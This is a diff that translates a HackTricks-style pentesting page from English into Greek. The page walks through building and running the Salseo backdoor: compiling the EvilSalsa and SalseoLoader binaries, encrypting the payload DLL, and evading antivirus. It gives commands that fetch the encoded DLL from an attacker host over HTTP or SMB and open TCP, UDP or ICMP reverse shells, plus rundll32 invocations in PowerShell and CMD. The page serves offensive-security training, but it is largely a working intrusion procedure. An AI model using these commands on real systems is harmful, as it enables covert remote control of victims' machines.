@@ -2,159 +2,142 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Compiling the binaries
+## Συγκέντρωση των δυαδικών αρχείων
 
-Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+Κατεβάστε τον πηγαίο κώδικα από το github και συγκεντρώστε το **EvilSalsa** και το **SalseoLoader**. Θα χρειαστείτε εγκατεστημένο το **Visual Studio** για να συγκεντρώσετε τον κώδικα.
 
-Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+Συγκεντρώστε αυτά τα έργα για την αρχιτεκτονική της Windows συσκευής όπου θα τα χρησιμοποιήσετε (Αν τα Windows υποστηρίζουν x64, συγκεντρώστε τα για αυτές τις αρχιτεκτονικές).
 
-You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
+Μπορείτε να **επιλέξετε την αρχιτεκτονική** μέσα στο Visual Studio στην **αριστερή καρτέλα "Build"** στην **"Platform Target".**
 
-(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(\*\*Αν δεν μπορείτε να βρείτε αυτές τις επιλογές, πατήστε στην **"Project Tab"** και στη συνέχεια στην **"\<Project Name> Properties"**)
 
 ![](<../images/image (132).png>)
 
-Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+Στη συνέχεια, κατασκευάστε και τα δύο έργα (Build -> Build Solution) (Μέσα στα logs θα εμφανιστεί η διαδρομή του εκτελέσιμου):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Prepare the Backdoor
+## Προετοιμάστε το Backdoor
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
+Πρώτα απ' όλα, θα χρειαστεί να κωδικοποιήσετε το **EvilSalsa.dll.** Για να το κάνετε αυτό, μπορείτε να χρησιμοποιήσετε το python script **encrypterassembly.py** ή μπορείτε να συγκεντρώσετε το έργο **EncrypterAssembly**:
 
 ### **Python**
-
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-
 ### Windows
-
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
+Εντάξει, τώρα έχετε όλα όσα χρειάζεστε για να εκτελέσετε όλα τα πράγματα Salseo: το **encoded EvilDalsa.dll** και το **binary of SalseoLoader.**
 
-Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**
+**Ανεβάστε το SalseoLoader.exe binary στη μηχανή. Δεν θα πρέπει να ανιχνεύονται από κανένα AV...**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+## **Εκτέλεση του backdoor**
 
-## **Execute the backdoor**
+### **Λήψη ενός TCP reverse shell (κατεβάζοντας το encoded dll μέσω HTTP)**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
-
-Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
-
+Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν HTTP server για να σερβίρετε το encoded evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
+### **Λήψη ενός UDP reverse shell (κατέβασμα κωδικοποιημένου dll μέσω SMB)**
 
-### **Getting a UDP reverse shell (downloading encoded dll through SMB)**
-
-Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
-
+Θυμηθείτε να ξεκινήσετε ένα nc ως τον listener του reverse shell και έναν SMB server για να εξυπηρετήσει το κωδικοποιημένο evilsalsa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
+### **Λήψη ICMP αντίστροφης θύρας (κωδικοποιημένο dll ήδη μέσα στο θύμα)**
 
-### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
+**Αυτή τη φορά χρειάζεστε ένα ειδικό εργαλείο στον πελάτη για να λάβετε την αντίστροφη θύρα. Κατεβάστε:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
-
-#### **Disable ICMP Replies:**
-
+#### **Απενεργοποίηση Απαντήσεων ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-
-#### Execute the client:
-
+#### Εκτέλεση του πελάτη:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-
-#### Inside the victim, lets execute the salseo thing:
-
+#### Μέσα στον θύμα, ας εκτελέσουμε το salseo πράγμα:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
+## Συγκέντρωση του SalseoLoader ως DLL που εξάγει τη βασική λειτουργία
 
-## Compiling SalseoLoader as DLL exporting main function
+Ανοίξτε το έργο SalseoLoader χρησιμοποιώντας το Visual Studio.
 
-Open the SalseoLoader project using Visual Studio.
-
-### Add before the main function: \[DllExport]
+### Προσθέστε πριν από τη βασική λειτουργία: \[DllExport]
 
 ![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Install DllExport for this project
+### Εγκαταστήστε το DllExport για αυτό το έργο
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **Εργαλεία** --> **Διαχειριστής Πακέτων NuGet** --> **Διαχείριση Πακέτων NuGet για τη Λύση...**
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+#### **Αναζητήστε το πακέτο DllExport (χρησιμοποιώντας την καρτέλα Αναζήτησης) και πατήστε Εγκατάσταση (και αποδεχτείτε το αναδυόμενο παράθυρο)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
+Στο φάκελο του έργου σας έχουν εμφανιστεί τα αρχεία: **DllExport.bat** και **DllExport_Configure.bat**
 
-### **U**ninstall DllExport
+### **Α**πεγκαταστήστε το DllExport
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+Πατήστε **Απεγκατάσταση** (ναι, είναι περίεργο αλλά εμπιστευτείτε με, είναι απαραίτητο)
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
-### **Exit Visual Studio and execute DllExport_configure**
+### **Έξοδος από το Visual Studio και εκτέλεση του DllExport_configure**
 
-Just **exit** Visual Studio
+Απλά **έξοδος** από το Visual Studio
 
-Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
+Στη συνέχεια, πηγαίνετε στο **φάκελο SalseoLoader** σας και **εκτελέστε το DllExport_Configure.bat**
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+Επιλέξτε **x64** (αν πρόκειται να το χρησιμοποιήσετε μέσα σε ένα x64 box, αυτό ήταν η περίπτωση μου), επιλέξτε **System.Runtime.InteropServices** (μέσα στο **Namespace για DllExport**) και πατήστε **Εφαρμογή**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
-### **Open the project again with visual Studio**
+### **Ανοίξτε ξανά το έργο με το Visual Studio**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport]** δεν θα πρέπει πλέον να επισημαίνεται ως σφάλμα
 
 ![](<../images/image (8) (1).png>)
 
-### Build the solution
+### Δημιουργία της λύσης
 
-Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+Επιλέξτε **Τύπος Έξοδου = Βιβλιοθήκη Κλάσης** (Έργο --> Ιδιότητες SalseoLoader --> Εφαρμογή --> Τύπος εξόδου = Βιβλιοθήκη Κλάσης)
 
 ![](<../images/image (10) (1).png>)
 
-Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+Επιλέξτε **πλατφόρμα x64** (Έργο --> Ιδιότητες SalseoLoader --> Δημιουργία --> Στόχος πλατφόρμας = x64)
 
 ![](<../images/image (9) (1) (1).png>)
 
-To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+Για να **δημιουργήσετε** τη λύση: Δημιουργία --> Δημιουργία Λύσης (Μέσα στην κονσόλα εξόδου θα εμφανιστεί η διαδρομή της νέας DLL)
 
-### Test the generated Dll
+### Δοκιμάστε την παραγόμενη DLL
 
-Copy and paste the Dll where you want to test it.
+Αντιγράψτε και επικολλήστε την DLL όπου θέλετε να τη δοκιμάσετε.
 
-Execute:
-
+Εκτελέστε:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
+Αν δεν εμφανιστεί σφάλμα, πιθανότατα έχετε ένα λειτουργικό DLL!!
 
-If no error appears, probably you have a functional DLL!!
+## Πάρτε ένα shell χρησιμοποιώντας το DLL
 
-## Get a shell using the DLL
-
-Don't forget to use a **HTTP** **server** and set a **nc** **listener**
+Μην ξεχάσετε να χρησιμοποιήσετε έναν **HTTP** **server** και να ρυθμίσετε έναν **nc** **listener**
 
 ### Powershell
-
 ```
 $env:pass="password"
 $env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
@@ -163,9 +146,7 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-
 ### CMD
-
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -174,5 +155,4 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
 {{#include ../banners/hacktricks-training.md}}
